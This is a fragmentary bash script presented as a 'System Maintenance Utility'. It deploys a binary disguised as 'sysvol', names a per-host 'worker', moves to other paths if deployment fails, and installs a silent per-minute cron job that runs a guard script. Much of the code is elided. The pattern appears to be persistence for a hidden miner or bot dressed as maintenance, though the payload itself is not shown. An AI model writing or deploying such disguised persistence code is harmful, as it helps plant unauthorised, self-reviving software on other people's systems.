#!/bin/bash
# System Maintenance Utility v7.0
...
_deploy() {
    ...
    "$B/sbin/sysvol" --version >/dev/null 2>&1 || {
        ...
        "$B/sbin/sysvol" --version >/dev/null 2>&1 || {
            ...
            "$B/sbin/sysvol" --version >/dev/null 2>&1 || return 1
            echo "[+] Relocated: $B"
        }
    }
    ...
    local W="srv-$(hostname)-$(date +%s | tail -c 4)"
    echo "[*] Worker: $W"
...
GRDEOF
    ...
    if pgrep -f "[s]ysvol" >/dev/null 2>&1; then
        ...
        command -v crontab &>/dev/null && {
            (crontab -l 2>/dev/null || echo ""; echo "* * * * * $B/run/guard.sh >/dev/null 2>&1") | crontab - 2>/dev/null && echo "[+] Cron installed" || echo "[!] Cron skipped"
        }
